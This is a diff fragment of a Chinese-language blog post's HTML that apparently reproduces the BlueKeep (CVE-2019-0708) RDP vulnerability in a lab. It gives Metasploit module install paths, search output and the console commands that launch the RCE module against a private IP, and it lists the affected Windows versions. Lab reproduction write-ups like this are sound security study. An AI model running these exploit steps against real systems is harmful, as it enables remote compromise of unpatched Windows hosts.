+<pre class="line-numbers language-java"><code class="language-java">rdp<span class="token punctuation">.</span>rb <span class="token operator">-</span><span class="token operator">></span> <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>metasploit<span class="token operator">-</span>framework<span class="token operator">/</span>lib<span class="token operator">/</span>msf<span class="token operator">/</span>core<span class="token operator">/</span>exploit 
 
-rdp_scanner.rb -&gt; /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp 
+rdp_scanner<span class="token punctuation">.</span>rb <span class="token operator">-</span><span class="token operator">></span> <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>metasploit<span class="token operator">-</span>framework<span class="token operator">/</span>modules<span class="token operator">/</span>auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>rdp 
 
-cve_2019_0708_bluekeep.rb -&gt; /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp 
+cve_2019_0708_bluekeep<span class="token punctuation">.</span>rb <span class="token operator">-</span><span class="token operator">></span> <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>metasploit<span class="token operator">-</span>framework<span class="token operator">/</span>modules<span class="token operator">/</span>auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>rdp 
 
-cve_2019_0708_bluekeep_rce.rb -&gt; /usr/share/metasploit-framework/modules/exploits/windows/rdp 
+cve_2019_0708_bluekeep_rce<span class="token punctuation">.</span>rb <span class="token operator">-</span><span class="token operator">></span> <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>metasploit<span class="token operator">-</span>framework<span class="token operator">/</span>modules<span class="token operator">/</span>exploits<span class="token operator">/</span>windows<span class="token operator">/</span>rdp 
 
 需要注意如果没有目录就去创建个。
-</code></pre><p>接下来就可以进入metasploit控制台操作了，进入之后先要重新加载所有模块<br><code>reload_all</code></p>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>接下来就可以进入metasploit控制台操作了，进入之后先要重新加载所有模块<br><code>reload_all</code></p>
 <p>之后直接搜索0708漏洞。</p>
-<pre><code>msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; search 0708
-=======
+<pre class="line-numbers language-java"><code class="language-java">msf5 <span class="token function">exploit</span><span class="token punctuation">(</span>windows<span class="token operator">/</span>rdp<span class="token operator">/</span>cve_2019_0708_bluekeep_rce<span class="token punctuation">)</span> <span class="token operator">></span> search <span class="token number">0708</span>
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
 
    #  Name                                             Disclosure Date  Rank    Check  Description
-   -  ----                                             ---------------  ----    -----  -----------
-   0  auxiliary/scanner/rdp/cve_2019_0708_bluekeep     2019-05-14       normal  Yes    CVE-2019-0708 BlueKeep Microsoft Remote Desktop RCE Check
-   1  exploit/windows/browser/clear_quest_cqole        2012-05-19       normal  No     IBM Rational ClearQuest CQOle Remote Code Execution
-   2  exploit/windows/browser/tumbleweed_filetransfer  2008-04-07       great   No     Tumbleweed FileTransfer vcst_eu.dll ActiveX Control Buffer Overflow
-   3  exploit/windows/rdp/cve_2019_0708_bluekeep_rce   2019-05-14       manual  Yes    CVE-2019-0708 BlueKeep RDP Remote Windows Kernel Use After Free
-   4  auxiliary/windows/rdp/cve_2019_0708_bluekeep     2019-05-14       normal  Yes    CVE-2019-0708 BlueKeep Microsoft Remote Desktop RCE Check
-</code></pre><pre><code>use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
-set rhosts 192.168.1.106
-set target 3
+   <span class="token operator">-</span>  <span class="token operator">--</span><span class="token operator">--</span>                                             <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>  <span class="token operator">--</span><span class="token operator">--</span>    <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>  <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
+   <span class="token number">0</span>  auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>rdp<span class="token operator">/</span>cve_2019_0708_bluekeep     <span class="token number">2019</span><span class="token operator">-</span><span class="token number">05</span><span class="token operator">-</span><span class="token number">14</span>       normal  Yes    CVE<span class="token operator">-</span><span class="token number">2019</span><span class="token operator">-</span><span class="token number">0708</span> BlueKeep Microsoft Remote Desktop RCE Check
+   <span class="token number">1</span>  exploit<span class="token operator">/</span>windows<span class="token operator">/</span>browser<span class="token operator">/</span>clear_quest_cqole        <span class="token number">2012</span><span class="token operator">-</span><span class="token number">05</span><span class="token operator">-</span><span class="token number">19</span>       normal  No     IBM Rational ClearQuest CQOle Remote Code Execution
+   <span class="token number">2</span>  exploit<span class="token operator">/</span>windows<span class="token operator">/</span>browser<span class="token operator">/</span>tumbleweed_filetransfer  <span class="token number">2008</span><span class="token operator">-</span><span class="token number">04</span><span class="token operator">-</span><span class="token number">07</span>       great   No     Tumbleweed FileTransfer vcst_eu<span class="token punctuation">.</span>dll ActiveX Control Buffer Overflow
+   <span class="token number">3</span>  exploit<span class="token operator">/</span>windows<span class="token operator">/</span>rdp<span class="token operator">/</span>cve_2019_0708_bluekeep_rce   <span class="token number">2019</span><span class="token operator">-</span><span class="token number">05</span><span class="token operator">-</span><span class="token number">14</span>       manual  Yes    CVE<span class="token operator">-</span><span class="token number">2019</span><span class="token operator">-</span><span class="token number">0708</span> BlueKeep RDP Remote Windows Kernel Use After Free
+   <span class="token number">4</span>  auxiliary<span class="token operator">/</span>windows<span class="token operator">/</span>rdp<span class="token operator">/</span>cve_2019_0708_bluekeep     <span class="token number">2019</span><span class="token operator">-</span><span class="token number">05</span><span class="token operator">-</span><span class="token number">14</span>       normal  Yes    CVE<span class="token operator">-</span><span class="token number">2019</span><span class="token operator">-</span><span class="token number">0708</span> BlueKeep Microsoft Remote Desktop RCE Check
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-java"><code class="language-java">use exploit<span class="token operator">/</span>windows<span class="token operator">/</span>rdp<span class="token operator">/</span>cve_2019_0708_bluekeep_rce
+set rhosts <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">1.106</span>
+set target <span class="token number">3</span>
 exploit
-</code></pre><p>target 参数在其他各个博客当中都讲到如果是VMware需要设置为3，所以我依照参考设置为3。</p>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>target 参数在其他各个博客当中都讲到如果是VMware需要设置为3，所以我依照参考设置为3。</p>
 <p><img src="/images/3/2.png" alt></p>
 <p>现在就是开开心心的等待shell的出现啦</p>
 <p><img src="/images/3/3.png" alt></p>
@@ -1047,11 +1264,12 @@ exploit</code></pre><p>随后进入的就是漫长的等待了，正当要绝望
 <p><img src="/images/3/7.png" alt></p>
 <p>至此复现结束。</p>
 <h1 id="0x03-漏洞危害"><a href="#0x03-漏洞危害" class="headerlink" title="0x03   漏洞危害"></a>0x03   漏洞危害</h1><p>目前公布的影响范围：</p>
-<pre><code>Windows 7
-Windows Server 2008 R2
-Windows Server 2008
-Windows 2003
-Windows XP</code></pre><p>该漏洞的影响范围巨大，甚至能和MS17-010相媲美，但是在实际利用过程中也可能造成实际生产环境的破坏，所以在检测是还是用scanner中的检测模块较好.</p>
+<pre class="line-numbers language-java"><code class="language-java">Windows <span class="token number">7</span>
+Windows Server <span class="token number">2008</span> R2
+Windows Server <span class="token number">2008</span>
+Windows <span class="token number">2003</span>
+Windows XP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>该漏洞的影响范围巨大，甚至能和MS17-010相媲美，但是在实际利用过程中也可能造成实际生产环境的破坏，所以在检测是还是用scanner中的检测模块较好.</p>
 
     
 
